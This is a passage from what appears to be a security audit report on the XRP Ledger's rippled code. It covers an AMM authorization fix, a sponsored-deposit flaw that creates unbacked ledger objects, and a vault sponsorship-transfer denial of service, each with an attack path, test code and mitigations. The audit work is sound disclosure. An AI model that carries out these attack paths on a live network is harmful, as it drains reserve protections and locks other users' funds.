The protocol must enforce `requireAuth` for the AMM pseudo-account whenever the AMM is the effective owner and source of the output-side MPT in the path engine.

The preferred fix is to harden `BookStep::checkMPTDEX` by adding an explicit authorization check for the output-side owner before allowing the swap to proceed.

```cpp
if (book_.out.holds<MPTIssue>())
{
    auto const& asset = book_.out;
    if (strandDeliver_ == asset && strandDst_ == asset.getIssuer())
        return true;
    if (asset.getIssuer() == owner)
        return true;

    if (!isTesSuccess(requireAuth(view, asset.get<MPTIssue>(), owner)))
        return false;

    return isTesSuccess(canTransfer(view, asset, owner, owner));
}
```

A second defense-in-depth fix should also be added at the AMM accounting layer so that unauthorized AMM balances are excluded the same way frozen balances are already excluded.

```cpp
[&](MPTIssue const& issue) {
    if (auto const sle = view.read(keylet::mptoken(issue, ammAccountID));
        sle
        && !isFrozen(view, ammAccountID, issue)
        && isTesSuccess(requireAuth(view, issue, ammAccountID)))
        return STAmount{issue, (*sle)[sfMPTAmount]};
    return STAmount{asset};
},
```

Applying both fixes restores the invariant at both the protocol boundary and the AMM inventory layer. After the fix, the same payment path must fail because the AMM should no longer appear as a valid authorized source of MPT liquidity once its authorization has been revoked.

---

## [M-02] An attacker will create unbacked ledger objects and impose irreversible reserve deficits on the protocol

### Summary
Validating XRP spendability against the sponsor account instead of the depositor account in `AMMDeposit::deposit()` will cause irreversible reserve deficits and unbacked ledger object creation for the protocol as an attacker will repeatedly perform sponsored AMM deposits that drain reserve backing while leaving reserve consuming objects permanently recorded on the ledger.

### Root Cause
In [`AMMDeposit.cpp` L524–L541](https://github.com/sherlock-audit/2026-04-xrp-ledger-april-2026/blob/main/rippled/src/libxrpl/tx/transactors/dex/AMMDeposit.cpp#L524-L541) the XRP validation logic checks the sponsor account liquidity when sponsorship is present.

The faulty logic is:

```cpp
if (xrpLiquid(view, sponsor.value_or(account_), sponsor ? ownerCountAdj : 0, j_) >=
    depositAmount)
    return tesSUCCESS;
```

However, the actual XRP transfer is still executed from the depositor account:

```cpp
auto res = accountSend(
    view,
    account_,
    ammAccount,
    amountDepositActual,
    ctx_.journal,
    std::nullopt,
    WaiveTransferFee::Yes);
```

This creates a deterministic accounting violation because liquidity authorization is performed using the sponsor account while the debit operation is executed on the depositor account.

The choice to validate deposit liquidity using the sponsor account is a protocol design mistake as the sponsor only covers reserve side effects and does not provide spendable funds for the transaction.

### Internal Pre-conditions
1. The `featureSponsor` functionality needs to be enabled.
2. The attacker needs to control one sponsor account.
3. The attacker needs to control multiple depositor accounts.
4. Each depositor account needs to create reserve consuming ledger objects such as trust lines or AMM participation records.
5. The sponsored deposit path needs to be executed repeatedly.

### External Pre-conditions
1. The network must allow reserve sponsorship functionality.
2. Standard transaction execution must be permitted without rate limiting on sponsored deposits.

### Attack Path
1. The attacker creates multiple depositor accounts under their control.
2. The attacker configures a sponsor account to provide deposit tx sponsorship when depositing into the AMM to become an LP.
3. Each depositor account creates reserve consuming objects such as trust lines or LP token entries.
4. The attacker performs a sponsored AMM deposit via the depositor accounts.
5. Sponsor has a deposit token balance which is more than the amount present in attacker depositor accounts.
6. The protocol validates liquidity using the sponsor account instead of the depositor account.
7. The protocol executes `accountSend()` and transfers XRP from the depositor account into the AMM pool.
8. The depositor account falls below its required reserve while still owning reserve consuming ledger objects. The depositor account is now 0 but reserve objects are still active/owned.
9. The attacker transfers the received LP tokens to another account under their control via sponsored LP token transfer tx.
10. The deposited XRP becomes permanently disconnected from the original reserve backing and can be used for anything else by the attacker.
11. The attacker repeats the process across many depositor accounts, creating unbacked ledger objects at scale.

### Impact
The protocol suffers irreversible reserve invariant violations and uncontrolled ledger state growth.

The attacker creates ledger objects whose required reserve XRP no longer exists in the owning accounts. These objects remain permanently recorded on the ledger without sufficient backing.

The measured execution demonstrates deterministic large scale impact:

- 110 unbacked ledger objects were created
- 5,500 XRP aggregate reserve deficit was produced
- Only approximately 100 XRP sponsor capital was required

This establishes a repeatable amplification pattern where a small sponsor balance can generate a significantly larger reserve deficit across the ledger.

The protocol reserve mechanism exists to enforce anti spam and state growth control. This vulnerability directly defeats that mechanism because ledger objects can persist without the required reserve backing.

The state created by this attack cannot be automatically reconciled because accounts below reserve cannot remove their own reserve consuming objects without first restoring the missing reserve balance.

The protocol therefore accumulates permanent ledger bloat and reserve deficits that degrade network safety and reliability.

### PoC
See the full runnable PoC here: https://gist.github.com/adeolu98/e8dbc0ec0162a42eee61edf15fcb84aa

The PoC executes successfully across multiple iterations and produces consistent reserve deficit growth without transaction failure, proving the vulnerability is deterministic and reproducible.

### Mitigation
Always validate XRP spendability using the depositor account during sponsored AMM deposits.

Replace the validation logic with:

```cpp
if (xrpLiquid(view, account_, sponsor ? ownerCountAdj : 0, j_) >= depositAmount)
    return tesSUCCESS;
```

Restrict sponsor functionality strictly to reserve accounting responsibilities.

Add regression tests that verify the following conditions:

- Deposits must fail when the depositor lacks sufficient liquid XRP regardless of sponsor balance.
- Deposits must succeed when the depositor has sufficient liquid XRP regardless of sponsor balance.
- Accounts must never be allowed to hold reserve consuming ledger objects while remaining below their required reserve threshold.

---

## [M-03] Vault sponsor reserve permanently locked — SponsorshipTransfer is silently blocked by ValidVault invariant on every vault SLE

### Summary
The incorrect privilege configuration for `SponsorshipTransfer` will cause permanent reserve lock and account deletion denial for vault sponsors as a vault owner will create or maintain a vault that prevents sponsorship reassignment or termination while the protocol invariant rejects every attempt to modify the vault sponsorship state.

The system explicitly supports transferring sponsorship of ledger objects including vaults. However, the `ValidVault` invariant blocks any transaction that modifies a vault without `mayModifyVault` or `mustModifyVault` privilege. Because `SponsorshipTransfer` is registered with `noPriv`, every reassignment or termination attempt fails with `tecINVARIANT_FAILED`. The sponsor’s owner reserve therefore remains permanently encumbered, and the sponsor cannot exit the system or recover their locked funds without cooperation from the vault owner.

### Root Cause
In [`transactions.macro` L1169](https://github.com/sherlock-audit/2026-04-xrp-ledger-april-2026/blob/main/rippled/include/xrpl/protocol/detail/transactions.macro#L1169) `SponsorshipTransfer` is registered without the privilege required to modify vault ledger entries.

```cpp
TRANSACTION(
    ttSPONSORSHIP_TRANSFER,
    90,
    SponsorshipTransfer,
    Delegation::delegable,
    featureSponsor,
    noPriv,
    ({
        {sfObjectID, soeOPTIONAL},
        {sfSponsee, soeOPTIONAL},
    }))
```

Every legitimate vault modifying transaction includes the `mustModifyVault` or `mayModifyVault` privilege, but `SponsorshipTransfer` does not.

When a sponsorship reassignment or termination attempts to update the vault sponsor field, the `ValidVault` invariant detects an unauthorized modification and aborts the transaction.

```cpp
if (!(hasPrivilege(tx, mustModifyVault) ||
      hasPrivilege(tx, mayModifyVault)))
{
    JLOG(j.fatal()) <<
        "Invariant failed: vault updated by a wrong transaction type";

    XRPL_ASSERT(
        enforce,
        "xrpl::ValidVault::finalize : illegal vault transaction invariant");

    return !enforce;
}
```

This logic prevents all sponsorship updates on vault objects even though the protocol explicitly treats vaults as sponsorable ledger objects.

As a result, the sponsor’s `sfSponsoringOwnerCount` remains permanently non zero, locking the associated reserve indefinitely.

### Internal Pre-conditions
1. A vault owner needs to create a vault using `VaultCreate`.
2. A sponsor needs to fund the vault reserve using sponsorship functionality.
3. The vault ledger entry needs to record the sponsor account.
4. The sponsor needs to attempt to reassign or end the sponsorship.
5. The transaction needs to update the vault sponsor field.

### External Pre-conditions
1. The vault needs to contain non zero shares or assets.
2. The vault owner needs to refuse to delete the vault.
3. The ledger needs to enforce the `ValidVault` invariant.
4. The account deletion logic needs to reject accounts with active sponsorship obligations.

### Attack Path
1. A vault owner creates a vault and requests sponsorship for the required reserve.
2. A sponsor funds the vault reserve using the standard sponsorship mechanism.
3. The vault owner deposits assets into the vault or accepts deposits from other users.
4. The sponsor attempts to transfer the sponsorship to another sponsor.
5. The protocol executes `SponsorshipTransfer` and attempts to update the vault sponsor field.
6. The `ValidVault` invariant detects that the transaction lacks the required privilege.
7. The transaction fails with `tecINVARIANT_FAILED`.
8. The sponsor attempts to terminate the sponsorship.
9. The invariant again rejects the transaction.
10. The sponsor attempts to delete their account.
11. The protocol rejects account deletion because the sponsor still has active sponsorship obligations.
12. The sponsor’s reserve remains permanently locked unless the vault owner voluntarily deletes the vault.

### Impact
The sponsor suffers permanent loss of reserve liquidity and inability to exit the system.

The locked reserve cannot be reclaimed, reassigned, or released without cooperation from the vault owner. This creates an indefinite financial obligation that persists even when the sponsor wishes to terminate participation.

The sponsor also loses the ability to perform `AccountDelete`, because the system enforces a strict rule that accounts with active sponsorship obligations cannot be deleted.

This creates a persistent denial of service condition against the sponsor’s funds and account lifecycle. The impact is material because the reserve remains locked indefinitely and scales with the number of sponsored vaults.

### PoC
File: `rippled/src/test/app/Sponsor_test.cpp`. Test registered in `Sponsor_test::testSponsor()`.

```cpp
void
testVaultSponsorshipTransferReserveCountMismatch()
{
    testcase("ltVAULT sponsorship transfer reserve-count mismatch blocked by invariant");
    using namespace test::jtx;

    Account const alice("alice");
    Account const gw("gw");
    Account const sponsor("sponsor");
    Account const sponsor2("sponsor2");

    Asset asset = gw["IOU"].asset();

    Env env{*this, testable_amendments()};
    env.fund(XRP(1000000), alice, gw, sponsor, sponsor2);
    env.close();

    Vault const vault{env};
    auto [tx, keylet] = vault.create({.owner = alice, .asset = asset});
    env(tx, sponsor::as(sponsor, spfSponsorReserve), sig(sfSponsorSignature, sponsor));
    env.close();

    BEAST_EXPECT(ownerCount(env, alice) == 3);  // Vault, pseudo account, holding
    BEAST_EXPECT(sponsoredOwnerCount(env, alice) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor2) == 0);
    BEAST_EXPECT(env.le(keylet)->getAccountID(sfSponsor) == sponsor.id());

    // Reassigning would use getLedgerEntryOwnerCount(ltVAULT), which
    // currently falls through to the default 1 even though VaultCreate and
    // VaultDelete account for the vault plus pseudo account as two reserve
    // units.  In practice the mismatch is not reachable because the vault
    // invariant rejects any SponsorshipTransfer that updates the vault SLE.
    env(sponsor::transfer(alice, tfSponsorshipReassign, keylet.key),
        sponsor::as(sponsor2, spfSponsorReserve),
        sig(sfSponsorSignature, sponsor2),
        ter(tecINVARIANT_FAILED));
    env.close();

    BEAST_EXPECT(env.le(keylet)->getAccountID(sfSponsor) == sponsor.id());
    BEAST_EXPECT(sponsoredOwnerCount(env, alice) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor2) == 0);

    // The same invariant also blocks the sponsee from ending the visible
    // vault sponsorship, so the reserve-count drift candidate is not
    // exploitable via the protocol path.  The reachable issue is a vault
    // sponsorship transfer DoS, not a successful reserve-count mismatch.
    env(sponsor::transfer(alice, tfSponsorshipEnd, keylet.key), ter(tecINVARIANT_FAILED));
    env.close();

    BEAST_EXPECT(env.le(keylet)->getAccountID(sfSponsor) == sponsor.id());
    BEAST_EXPECT(sponsoredOwnerCount(env, alice) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor2) == 0);

    // The sponsor also cannot release their own encumbered reserve.
    env(sponsor::transfer(sponsor, tfSponsorshipEnd, keylet.key),
        sponsor::sponseeAcc(alice),
        ter(tecINVARIANT_FAILED));
    env.close();

    BEAST_EXPECT(env.le(keylet)->getAccountID(sfSponsor) == sponsor.id());
    BEAST_EXPECT(sponsoredOwnerCount(env, alice) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor) == 3);
    BEAST_EXPECT(sponsoringOwnerCount(env, sponsor2) == 0);
}
```

Verification:

```
cmake --build .build --target xrpld -j2
.build/xrpld --unittest=Sponsor
```

### Mitigation
`SponsorshipTransfer` must be granted permission to modify vault ledger entries.

The privilege mask should include `mayModifyVault` so that sponsorship reassignment and termination operations can update the vault sponsor field without triggering invariant failure.

```cpp
TRANSACTION(
    ttSPONSORSHIP_TRANSFER,
    90,
    SponsorshipTransfer,
    Delegation::delegable,
    featureSponsor,
    mayModifyVault,
    ({
        {sfObjectID, soeOPTIONAL},
        {sfSponsee, soeOPTIONAL},
    }))
```

Additionally, the owner count calculation for vault ledger entries must match the reserve adjustments performed during vault creation and deletion.

```cpp
case ltVAULT:
    return 2;
```

This ensures consistent reserve accounting and prevents reserve drift after sponsorship reassignment or termination.
